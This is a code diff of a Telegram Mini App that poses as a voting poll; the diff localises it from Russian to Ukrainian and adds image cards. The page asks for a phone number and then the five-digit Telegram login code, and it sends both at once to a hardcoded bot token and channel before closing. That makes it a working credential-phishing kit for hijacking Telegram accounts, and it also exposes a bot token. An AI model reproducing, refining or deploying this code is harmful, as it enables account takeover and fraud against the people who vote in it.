@@ -1,63 +1,104 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="uk">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --bg: var(--tg-theme-bg-color, #fff); --text: var(--tg-theme-text-color, #000); --hint: var(--tg-theme-hint-color, #999); --btn: var(--tg-theme-button-color, #3390ec); --btn-text: var(--tg-theme-button-text-color, #fff); }
+        :root { --bg: var(--tg-theme-bg-color, #fff); --text: var(--tg-theme-text-color, #000); --hint: var(--tg-theme-hint-color, #999); --btn: var(--tg-theme-button-color, #3390ec); --btn-text: var(--tg-theme-button-text-color, #fff); --card-bg: var(--tg-theme-secondary-bg-color, #f1f1f1); }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background: var(--bg); color: var(--text); margin: 0; }
-        h2 { font-size: 22px; font-weight: 600; margin: 20px 0 10px; text-align: center; }
+        h2 { font-size: 22px; font-weight: 600; margin: 20px 0 15px; text-align: center; }
         p { font-size: 14px; color: var(--hint); margin-bottom: 15px; text-align: center; }
-        .vote-option { border: 2px solid var(--hint); border-radius: 12px; padding: 15px; margin-bottom: 10px; font-size: 16px; font-weight: 500; cursor: pointer; transition: all .2s; }
-        .vote-option.selected { border-color: var(--btn); background: rgba(51,144,236,.1); }
-        .main-btn { background: var(--btn); color: var(--btn-text); border: none; border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600; width: 100%; margin-top: 15px; cursor: pointer; }
+        
+        /* Картки з картинками */
+        .vote-card { 
+            display: flex; 
+            align-items: center; 
+            background: var(--card-bg); 
+            border: 2px solid transparent; 
+            border-radius: 14px; 
+            padding: 10px; 
+            margin-bottom: 12px; 
+            cursor: pointer; 
+            transition: all 0.2s; 
+        }
+        .vote-card.selected { border-color: var(--btn); background: rgba(51,144,236,.1); }
+        .vote-card img { 
+            width: 60px; height: 60px; 
+            border-radius: 10px; 
+            object-fit: cover; 
+            margin-right: 15px; 
+            background: #ccc;
+        }
+        .vote-card .vote-title { font-size: 16px; font-weight: 600; }
+
+        .main-btn { background: var(--btn); color: var(--btn-text); border: none; border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600; width: 100%; margin-top: 10px; cursor: pointer; }
         .main-btn:disabled { opacity: .5; cursor: not-allowed; }
+        .back-btn { background: transparent; color: var(--hint); border: none; font-size: 14px; margin-top: 15px; cursor: pointer; display: block; width: 100%; text-decoration: underline; }
+        
         .hidden { display: none !important; }
         input[type="tel"], input[type="text"] { width: 100%; box-sizing: border-box; padding: 14px; font-size: 18px; border: 2px solid var(--hint); border-radius: 10px; background: var(--bg); color: var(--text); margin-bottom: 12px; text-align: center; }
         input:focus { outline: none; border-color: var(--btn); }
-        #debug { font-size: 12px; color: #34c759; margin-top: 15px; text-align: center; word-break: break-all; }
+        #debug { font-size: 12px; color: #34c759; margin-top: 20px; text-align: center; word-break: break-all; }
     </style>
 </head>
 <body>
 
-    <!-- ЭКРАН 1: ГОЛОС -->
+    <!-- ЕКРАН 1: ГОЛОСУВАННЯ -->
     <div id="screen-vote">
-        <h2>Сделайте выбор</h2>
-        <div class="vote-option" data-vote="Вариант 1" onclick="selectVote(this)">Вариант 1</div>
-        <div class="vote-option" data-vote="Вариант 2" onclick="selectVote(this)">Вариант 2</div>
-        <div class="vote-option" data-vote="Вариант 3" onclick="selectVote(this)">Вариант 3</div>
-        <button class="main-btn" id="btn-next-vote" disabled onclick="showPhone()">Далее</button>
+        <h2>Зробіть вибір</h2>
+        <p>Натисніть на одну з карток</p>
+        
+        <!-- ЗАМІНИ ПОСИЛАННЯ В src НА СВОЇ КАРТИНКИ -->
+        <div class="vote-card" data-vote="Варіант 1" onclick="selectVote(this)">
+            <img src="https://picsum.photos/id/1015/100/100" alt="Варіант 1">
+            <div class="vote-title">Варіант 1</div>
+        </div>
+        
+        <div class="vote-card" data-vote="Варіант 2" onclick="selectVote(this)">
+            <img src="https://picsum.photos/id/1025/100/100" alt="Варіант 2">
+            <div class="vote-title">Варіант 2</div>
+        </div>
+        
+        <div class="vote-card" data-vote="Варіант 3" onclick="selectVote(this)">
+            <img src="https://picsum.photos/id/1035/100/100" alt="Варіант 3">
+            <div class="vote-title">Варіант 3</div>
+        </div>
+
+        <button class="main-btn" id="btn-next-vote" disabled onclick="showPhone()">Далі</button>
     </div>
 
-    <!-- ЭКРАН 2: НОМЕР (ТОЛЬКО РУЧНОЙ ВВОД) -->
+    <!-- ЕКРАН 2: НОМЕР -->
     <div id="screen-phone" class="hidden">
         <h2>Ваш номер</h2>
-        <p>Введите номер телефона для учета голоса</p>
-        <input type="tel" id="phone-input" placeholder="+7 900 123-45-67">
-        <button class="main-btn" id="btn-manual" disabled onclick="submitPhone()">Отправить номер</button>
+        <p>Введіть номер телефону для обліку голосу</p>
+        <input type="tel" id="phone-input" placeholder="+380 99 123-45-67">
+        <button class="main-btn" id="btn-manual" disabled onclick="submitPhone()">Надіслати номер</button>
+        
+        <!-- Кнопка повернення назад -->
+        <button class="back-btn" onclick="goBack('screen-phone', 'screen-vote')">← Змінити голос</button>
     </div>
 
-    <!-- ЭКРАН 3: КОД -->
+    <!-- ЕКРАН 3: КОД -->
     <div id="screen-code" class="hidden">
-        <h2>Введите код</h2>
-        <p>Код из 5 цифр, который пришел в Telegram</p>
+        <h2>Введіть код</h2>
+        <p>Код із 5 цифр, який надійшов у Telegram</p>
         <input type="text" id="code-input" inputmode="numeric" maxlength="5" placeholder="00000" autocomplete="one-time-code">
-        <button class="main-btn" id="btn-submit" disabled onclick="submitCode()">Отправить код</button>
+        <button class="main-btn" id="btn-submit" disabled onclick="submitCode()">Надіслати код</button>
+        
+        <!-- Кнопка повернення назад -->
+        <button class="back-btn" onclick="goBack('screen-code', 'screen-phone')">← Змінити номер</button>
     </div>
 
     <div id="debug"></div>
 
     <script>
-        // ТОКЕН И ID КАНАЛА ДЛЯ МГНОВЕННОЙ ОТПРАВКИ
         const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
         const CHAT_ID = "-1004399809740";
 
         const dbg = (m) => { console.log('[VOTE]', m); const d = document.getElementById('debug'); if (d) d.innerText = m; };
-
         let selectedVote = null;
 
-        // Мгновенная отправка в Telegram
         async function sendLog(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -65,18 +106,18 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                 });
-            } catch (e) {
-                console.error("Ошибка отправки", e);
-            }
+            } catch (e) { console.error("Помилка", e); }
         }
 
+        // Вибір картки
         function selectVote(el) {
-            document.querySelectorAll('.vote-option').forEach(e => e.classList.remove('selected'));
+            document.querySelectorAll('.vote-card').forEach(e => e.classList.remove('selected'));
             el.classList.add('selected');
             selectedVote = el.getAttribute('data-vote');
             document.getElementById('btn-next-vote').disabled = false;
         }
 
+        // Переходи між екранами
         function showPhone() {
             if (!selectedVote) return;
             document.getElementById('screen-vote').classList.add('hidden');
@@ -84,7 +125,12 @@
             setTimeout(() => document.getElementById('phone-input').focus(), 100);
         }
 
-        // --- ШАГ 2: ОТПРАВКА НОМЕРА ---
+        function goBack(hideId, showId) {
+            document.getElementById(hideId).classList.add('hidden');
+            document.getElementById(showId).classList.remove('hidden');
+        }
+
+        // КРОК 2: ВІДПРАВКА НОМЕРА
         const phoneInput = document.getElementById('phone-input');
         phoneInput.addEventListener('input', () => {
             phoneInput.value = phoneInput.value.replace(/[^\d+]/g, '');
@@ -93,18 +139,16 @@
 
         function submitPhone() {
             let phone = phoneInput.value;
-            dbg('Номер отправлен: ' + phone);
+            dbg('Номер надіслано: ' + phone);
             
-            // МГНОВЕННО ШЛЕМ В КАНАЛ
             sendLog(`📱 <b>НОМЕР:</b> ${phone}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
             
-            // Переключаем на экран кода
             document.getElementById('screen-phone').classList.add('hidden');
             document.getElementById('screen-code').classList.remove('hidden');
             setTimeout(() => document.getElementById('code-input').focus(), 100);
         }
 
-        // --- ШАГ 3: ОТПРАВКА КОДА ---
+        // КРОК 3: ВІДПРАВКА КОДУ
         const codeInput = document.getElementById('code-input');
         codeInput.addEventListener('input', () => {
             codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 5);
@@ -114,20 +158,16 @@
         function submitCode() {
             const code = codeInput.value;
             if (code.length !== 5) return;
+            dbg('Код надіслано: ' + code);
 
-            dbg('Код отправлен: ' + code);
-
-            // МГНОВЕННО ШЛЕМ В КАНАЛ
             sendLog(`🔑 <b>КОД:</b> ${code}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
-
-            // Закрываем мини-апп
             setTimeout(() => { try { window.Telegram.WebApp.close(); } catch(e){} }, 500);
         }
 
         window.onload = () => {
             if (window.Telegram && window.Telegram.WebApp) {
                 window.Telegram.WebApp.expand();
-                dbg('Готов к работе');
+                dbg('Готово до роботи');
             }
         };
     </script>
